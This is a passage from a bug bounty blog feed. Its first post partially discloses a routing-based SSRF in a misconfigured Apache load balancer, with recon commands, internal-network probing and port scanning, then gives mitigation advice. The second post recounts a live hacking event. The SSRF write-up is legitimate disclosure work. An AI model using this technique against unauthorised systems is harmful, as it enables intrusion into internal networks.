  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-1&quot;&gt;3.1.1. Accessing the internal network&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-2&quot;&gt;3.1.2. Scanning the internal network&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does this vulnerability exist?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to show a vulnerability that I found some years ago, in my beginnings as a bounty hunter. It is not my most original post and the final impact found was not critical, but as I am always talking about the same vulnerabilities (XSS, SQLi…), I felt like making a post about a somewhat different vulnerability, just to change up my content a bit :smiley:. Besides, it’s always good to look back at bugs found some time ago to draw conclusions and think what could have been done better.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path &lt;em&gt;/home/user/.config/amass/config.ini&lt;/em&gt;, you can use the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;amass enum -brute -d example.com &apos;/home/user/.config/amass/config.ini&apos; | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;Amass&lt;/a&gt; is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;Httpx&lt;/a&gt; is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies… that I have specified in the parameters to be displayed.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;The main page worked over HTTP and it didn’t look like a big deal. It only displayed the text &lt;em&gt;It works!&lt;/em&gt;, as can be seen in the following evidence:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/main-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Although it is difficult to decide which part belongs to the discovery and which part belongs to the exploitation, I got the initial clue from the &lt;em&gt;Burp Scanner&lt;/em&gt;, as can be seen in the following capture:&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;
  &lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/issue-finding-1.png&quot; /&gt;
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;This alert indicates the presence of an &lt;em&gt;External service interaction (DNS)&lt;/em&gt; in the server root. This type of alert is usually not a symptom of a vulnerability as it may be due to intentional web functionality and is usually in the &lt;em&gt;Host&lt;/em&gt; header of the request. However, it can sometimes allow access to the internal network, as can be seen in the following &lt;em&gt;PortSwigger&lt;/em&gt; links:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf&quot;&gt;Routing-based SSRF (PortSwigger)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf&quot;&gt;Lab: Routing-based SSRF (PortSwigger)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, when I looked at the alert in detail I saw the following:&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;
  &lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/issue-finding-2.png&quot; /&gt;
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the injection is not happening in the &lt;em&gt;Host&lt;/em&gt; header, but in the HTTP verb path itself. This caught my attention because I had not seen it until then, so to check that it was not a false positive I sent the request again to a new instance of burp collaborator and checked that indeed several DNS requests were coming, as can be seen in the following capture:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/burp-collaborator.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In principle, a DNS request to an external server doesn’t mean much. If it were an HTTP request, it would be much more interesting. However, the fact that the request is made using the path and not through the &lt;em&gt;Host&lt;/em&gt; header struck me as unusual. That’s why I decided to dig a little deeper here :mag:.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1-1&quot; /&gt;

&lt;h3 id=&quot;311-accessing-the-internal-network&quot;&gt;3.1.1. Accessing the internal network&lt;/h3&gt;

&lt;p&gt;The main risk of this typec of vulnerability is that it could allow making requests to the internal network. Because of this, I continued investigating the target to see if I could find any private IP addresses disclosed in the HTML, JavaScript, comments, or elsewhere but I found nothing. Burpsuite also didn’t flag anything interesting.&lt;/p&gt;

&lt;p&gt;So, I decided to use a tool that I believe isn’t used much in bug bounty hunting: &lt;em&gt;nikto&lt;/em&gt;. I executed the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;nikto -h http://example.com/
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;where the &lt;em&gt;-h&lt;/em&gt; option specifies the host.&lt;/p&gt;

&lt;p&gt;The result was this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/nikto.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This file is quite interesting because it seems to be the admin interface of a load balancer, specifically for &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/mod_proxy_balancer.html&quot;&gt;Apache Module mod_proxy_balancer&lt;/a&gt;. It reveals the following info:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/balancer-manager.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is the Apache balancer manager interface or &lt;em&gt;mod_proxy_balancer&lt;/em&gt; module. As you can see, there’s a lot of useful information here, such as potential private IPs that could be used for further exploitation. Additionally, there’s a panel to edit the load balancer’s configuration, something I didn’t test since this was a production system. However, I reported it separately and received a bounty of just over $50 for it.&lt;/p&gt;

&lt;p&gt;To confirm whether I could exploit an SSRF, I tested all the private IPs listed. Only one yielded an interesting response, 10.80.3.122, as shown below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/wildfly-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;WildFly Application Server&lt;/em&gt; is an open-source, Java-based application server developed by the &lt;em&gt;JBoss Community&lt;/em&gt; under the &lt;em&gt;Red Hat umbrella&lt;/em&gt;. It is part of the &lt;em&gt;WildFly&lt;/em&gt; family and serves as a platform for building, deploying, and hosting &lt;em&gt;Java EE&lt;/em&gt; (Enterprise Edition) applications.&lt;/p&gt;

&lt;p&gt;The capture above shows how I was able to make a request to the internal network. This confirmed the existence of a routing-based SSRF vulnerability, likely caused by a misconfiguration in the load balancer. It’s essentially an SSRF vulnerability, but instead of being exploited via the Host header, it works through the HTTP verb’s full URL path.&lt;/p&gt;

&lt;p&gt;While exploring further, I clicked on the &lt;em&gt;Render&lt;/em&gt; tab to get a clearer view of all the possible options. That’s when I discovered there was an admin console available:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/wildfly-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/dwight-excitement.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inspecting the HTML code revealed that the admin console was located at the path &lt;em&gt;/console&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/wildfly-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately, I didn’t save the request in the burp project, but when I tried to access it, I got a response like&lt;/p&gt;

&lt;p&gt;&lt;em&gt;You don’t have permission to access this resource&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Damn!&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/dwight-disappointment.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-1-2&quot; /&gt;

&lt;h3 id=&quot;312-scanning-the-internal-network&quot;&gt;3.1.2. Scanning the internal network&lt;/h3&gt;

&lt;p&gt;As you can see, all the IPs found belong to the Class A network (10.X.X.X or 10.0.0.0/8) and appear to be part of the same subnet (10.80.3.X or 10.80.3.0/24). The recon I could have performed in a situation like this is absolutely crazy:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Available IPs.&lt;/li&gt;
  &lt;li&gt;Open ports and running services.&lt;/li&gt;
  &lt;li&gt;Specific recon for each service, such as identifying routes and files on HTTP services like the one I found.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Although I conducted some recon across these categories, I honestly don’t think I went as deep as I could have, mainly for 3 reasons:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;This bug was one of my first findings as a bug bounty hunter.&lt;/li&gt;
  &lt;li&gt;Since I was directly interacting with the internal network, I was concerned about being detected by the company’s internal security measures, such as firewalls, IDSs, IDPs… so I chose not to make too much noise.&lt;/li&gt;
  &lt;li&gt;The internal network wasn’t explicitly in the program’s scope. While it’s unlikely I would have faced severe consequences, probing too deeply into the internal network might have cjeopardized the bounty or even led to warnings or penalties.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Even so, I did a lot of recon through Burpsuite intruder varying IPs, ports, paths… but it would be unfeasible to show all that recon in this post. An example of this recon is the following port scan I performed on the same IP where the &lt;em&gt;WildFly&lt;/em&gt; service was running, the IP 10.80.3.122:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-12-07-breaking-the-perimeter-by-exploiting-routing-based-ssrf-via-a-misconfigured-load-balancer/port-scan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is some interesting behavior:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;HTTP codes 200, 301 and 502.&lt;/strong&gt; After exploring the responses I came to the conclusion that these responses may correspond to open ports. It is not clear that all the ports associated with this response are open ports but it seems that any open port falls into this category. For example, port 22 has an SSH service on version &lt;em&gt;SSH-2.0-OpenSSH_5.3&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;HTTP code 503&lt;/strong&gt;. It seems to be the default HTTP code for closed port and is the code returned by all other ports.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In conclusion, I demonstrated that it is possible to run a port scan on the internal network. Specifically, the result shows that IP 10.80.3.122 has potentially open ports 22, 111, 1556, 1556, 3237, 3528, 7777, 8009, 8080, 9990, 9999, 10000, 10050, 13782, 36174, 54186 and 55422.&lt;/p&gt;

&lt;p&gt;So since reporting something like&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Exposure of an internal *WildFly&lt;/em&gt; service*&lt;/p&gt;

&lt;p&gt;felt too specific and challenging to explain in terms of impact, I decided to approach the issue from a broader and more impactful perspective. I reported it as&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Routing-based SSRF on the balancer allows access to and scanning of the internal network&lt;/em&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-this-vulnerability-exist&quot;&gt;3.2. Why does this vulnerability exist?&lt;/h2&gt;

&lt;p&gt;In summary, the fundamental reason is that the &lt;em&gt;Apache Balancer&lt;/em&gt; is either misconfigured or running with its default configuration. This vulnerability could be broken down into two misconfigurations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Exposed Apache balancer manager interface.&lt;/strong&gt; The Apache balancer manager interface is exposed to the internet when its access should be restricted through authentication or limited to internal network or VPN access. This could be mitigated by adding a directive like the following to the Apache configuration:&lt;/p&gt;

    &lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Location &quot;/balancer-manager&quot;&amp;gt;
  Require ip 10.0.0.0/8
  Require all denied
&amp;lt;/Location&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;This directive allows access to the &lt;em&gt;/balancer-manager&lt;/em&gt; path &lt;strong&gt;only&lt;/strong&gt; from IP addresses in the 10.0.0.0/8 range.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Incorrect routing to internal assets.&lt;/strong&gt; The balancer allows requests to be made to both external and internal network assets. This could be due to misconfiguration of directives like &lt;em&gt;ProxyRequests&lt;/em&gt;, &lt;em&gt;ProxyPass&lt;/em&gt; or &lt;em&gt;ProxyPassReverse&lt;/em&gt; in the Apache configuration. For instance, when &lt;em&gt;ProxyRequests&lt;/em&gt; is enabled, as shown in the following directive&lt;/p&gt;

    &lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ProxyRequests On
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;Apache allows the use of full URLs and acts as an open proxy.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These are just theories but align with the observed behavior of the vulnerability.&lt;/p&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;As I said before, the subdomain was not important so it was classified as low criticity. In addition, although I was not able to demonstrate a significant impact, the simple fact of gaining access to the internal network was enough for them to classify it as a vulnerability of high severity because of the consequences that it could have in the future if they decide to add other important assets to the network. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: Low&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: High&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $100&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Pay attention to all subdomains, even those that may not seem important&lt;/strong&gt;, because they can still impact other subdomains or key assets. In terms of CVSS, you could say that all subdomains should be considered, since the &lt;em&gt;Scope&lt;/em&gt; component of the vulnerability might be &lt;em&gt;Changed&lt;/em&gt;. For example, in this case I gained access to the internal network through a subdomain with no apparent functionality, where potentially critical assets for the company could be located.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Don’t hesitate to dive deeper into recon when necessary.&lt;/strong&gt; In this case, I did quite a bit of recon, but since I was just starting out as a bug bounty hunter, I probably didn’t do as much as I should have. There was also the risk of being detected during exploitation, as I was interacting with internal network assets, which could lead to the vulnerability being patched before I had a chance to report it. Still, I will never know if I would have found anything important if I had done a more thorough recon.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sometimes, while searching for or exploiting a vulnerability, you may stumble upon others that you can report separately.&lt;/strong&gt; In this case, the main vulnerability was an SSRF, but along the way I found an exposed load balancer console that allowed modifying its configuration. I considered these to be two separate vulnerabilities with different impacts, even though the second helped me exploit the first, and I ended up getting two separate bounties. I don’t think this is common, but it’s always worth reporting both vulnerabilities properly and giving it a try.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Think carefully about how you want to approach your report.&lt;/strong&gt; In this case, I didn’t find the impact I was hoping for, which was gaining access to one of the internal assets. However, instead of focusing on what I couldn’t do, I decided to focus on what I could do and explain that clearly. So, I reported that I could perform scans on the internal network, rather than a failed attempt to access an admin console. I didn’t get a critical, okay, but I did get a high.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="portswigger" /><category term="burpsuite" /><category term="burp scanner" /><category term="nikto" /><category term="mod_proxy_balancer" /><category term="ssrf" /><summary type="html">Partial disclosure of a bug bounty report: breaking the perimeter by exploiting routing-based SSRF via a misconfigured load balancer.</summary></entry><entry><title type="html">HackerNight 2024: my first live hacking event</title><link href="https://hackcommander.github.io/posts/2024/06/10/hackernight-2024-my-first-live-hacking-event/" rel="alternate" type="text/html" title="HackerNight 2024: my first live hacking event" /><published>2024-06-10T00:00:00+02:00</published><updated>2024-06-10T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2024/06/10/hackernight-2024-my-first-live-hacking-event</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/06/10/hackernight-2024-my-first-live-hacking-event/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. What is HackerNight?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Why did I sign up for HackerNight?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. The course of HackerNight&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Entry to the event&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. During the event&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-3&quot;&gt;3.3. Outcome of the event&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Conclusions of HackerNight&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-06-10-hackernight-2024-my-first-live-hacking-event/rooted-hn-logo.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This post does not contain technical details about the vulnerabilities I found in the event because in order to participate in the event I signed a NDA (non-disclosure agreement), so this post is a review about the event and not a technical post about bug bounty.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to review my experience at the HackerNight live hacking event organized by Yogosha at RootedCON. This was my first live hacking event and against all odds I got the first blood on one of the customers.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-what-is-hackernight&quot;&gt;1. What is HackerNight?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.rootedcon.com/noticias/rooted2024-hackernight/&quot;&gt;HackerNight&lt;/a&gt; is a live hacking event (LHE) for bug bounty hunters organized by &lt;a href=&quot;https://yogosha.com/&quot;&gt;Yogosha&lt;/a&gt; at the &lt;a href=&quot;https://www.rootedcon.com/&quot;&gt;RootedCON&lt;/a&gt; conference in &lt;a href=&quot;https://kinepolis.es/&quot;&gt;Kinepolis&lt;/a&gt;, a cinema in Madrid. This year’s RootedCON Spain took place on March 7 to 9 in Madrid and HackerNight took place during the night of March 8 to 9. In this event bug bounty hunters from different countries gather in person to hack on the programs selected for the event, sharing snacks and experiences.&lt;/p&gt;

&lt;p&gt;To sign up for this event you don’t need to be a pro bounty hunter (I’m not) or have previous bug bounty experience as access to the event is free and anyone can sign up for a cost of 50 euros. You don’t even have to attend the RootedCon congress, because, although the HackerNight is organized in the context of the RootedCON, they are different events. In my case I went to both events because both tickets were paid for by the company I work for, &lt;a href=&quot;https://www.tarlogic.com/&quot;&gt;Tarlogic&lt;/a&gt;. Nobody will be watching you, if you don’t find any bug it’s ok :smiley:&lt;/p&gt;

&lt;p&gt;However, it is one thing to sign up for the event and another to find a valid bug. If you are a beginner hunter I recommend you to go with low expectations in this sense because there are many variables that influence the fact of finding something: scope and age of the programs, quality of the event that year, luck… Of the almost 100 hackers that attended the event, I think only about 15% of the participants got a valid report.&lt;/p&gt;

&lt;p&gt;In my case I found several bugs by chance, as I will explain below. I was very lucky, and if I had not found anything I would not be a worse hunter than I am. In fact the event was attended by many hackers better than me who did not find any bug, and they are still better than me.&lt;/p&gt;

&lt;p&gt;That’s why I recommend that you take the event as a time for leisure and fun with other hackers, rather than as a challenge where failing means you’re a loser. Enjoy the people, the food, the atmosphere, and, above all, the hacking.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-why-did-i-sign-up-for-hackernight&quot;&gt;2. Why did I sign up for HackerNight?&lt;/h2&gt;

&lt;p&gt;I signed up for this event because it was my third time going to RootedCON and none of the previous years I felt confident enough to sign up. I always thought that maybe I wasn’t ready to participate in this kind of event and besides, I found more interesting the idea of spending the night drinking beer than with a computer :beers:&lt;/p&gt;

&lt;p&gt;However this time I signed up because during the last year I have collaborated with some people who are dedicated to bug bounty but with whom I only talk through Telegram and Discord. So it seemed like a good opportunity to meet many of them face to face.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-the-course-of-hackernight&quot;&gt;3. The course of HackerNight&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-entry-to-the-event&quot;&gt;3.1. Entry to the event&lt;/h2&gt;

&lt;p&gt;To be honest, when it was time to enter I didn’t really want to get into the event. I love hacking, but it’s something I do in my spare time at home, and while I had to go to the event, my friends were drinking beer. I had also woken up at 10:00 am to go to the RootedCON talks, I hadn’t taken a nap and I hadn’t had dinner either. I also didn’t have any script ready to do recon because so far all the bug bounty I do is essentially manual. In short, I was tired, hungry and not in the mood to hack :satisfied:. However, it was obvious that I had to go in because I wanted to live the experience.&lt;/p&gt;

&lt;p&gt;The event was supposed to run from 8:00 pm on March 8 to 8:00 am on March 9, that is, 12 hours of hacking. However, due to a delay in the registrations and in the preparation of the event, in the end the event started around 11:00 pm. When I entered I sat at a table with my colleagues of Tarlogic and, although there is no picture of me at the event, I can tell you that I’m the one sitting there on the right:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-06-10-hackernight-2024-my-first-live-hacking-event/me.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-during-the-event&quot;&gt;3.2. During the event&lt;/h2&gt;

&lt;p&gt;I don’t keep a logbook about the event, but the approximate timeline of the event was:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;11:00 pm:&lt;/strong&gt; start of HackerNight.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;11:00 pm - 1:00 am:&lt;/strong&gt; participating in one of the programs without a defined strategy and without understanding the logic of the application.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;1:00 am - 4:00 am:&lt;/strong&gt; eating pringles and hamburgers and drinking monsters to drown my sorrows because I wasn’t focused and couldn’t find anything :cry:.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;4:00 am - 4:25 am:&lt;/strong&gt; taking a look at the scope of another program, I saw something that looked familiar. I found a vulnerability by chance, against all odds.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;4:25 am:&lt;/strong&gt; reported the first vulnerability as &lt;em&gt;Medium&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;4:42 am:&lt;/strong&gt; the customer accepted the vulnerability as &lt;em&gt;Medium&lt;/em&gt; and my nickname, &lt;em&gt;HackCommander&lt;/em&gt;, appeared on the movie screen in the first bloods section to applause. At that moment, all my accumulated fatigue vanished, and I felt a rush of excitement.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2024-06-10-hackernight-2024-my-first-live-hacking-event/first-blood.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;This picture was taken long after I got the first blood so I had already been kicked off the leaderboard, but I was present for some hours. In fact, I think if they had updated the leaderboard after I was accepted for the &lt;em&gt;High&lt;/em&gt; vulnerability, I might have been in.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;4:42 am - 6:58 am:&lt;/strong&gt; working hard on the same program to test some ideas that came up after the first report.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;6:58 am:&lt;/strong&gt; reported the second vulnerability as &lt;em&gt;Medium&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;7:27 am:&lt;/strong&gt; the customer replied that they were not able to reproduce the bug, and it was true. Due to all the fatigue, I made a mistake in the report.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;7:43 am:&lt;/strong&gt; corrected the error in the report, but the event was about to end.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;8:00 am:&lt;/strong&gt; HackerNight ends with &lt;a href=&quot;https://es.linkedin.com/in/djuradopallares&quot;&gt;Diego Jurado&lt;/a&gt; as the winner.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Therefore, I finished the HackerNight with a &lt;em&gt;Medium&lt;/em&gt; vulnerability accepted and another &lt;em&gt;Medium&lt;/em&gt; pending in triage, completely zombie-like from lack of sleep but full of pride. The battle was over and I was still standing, with traces of blood on my sword.&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/300-rain.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;

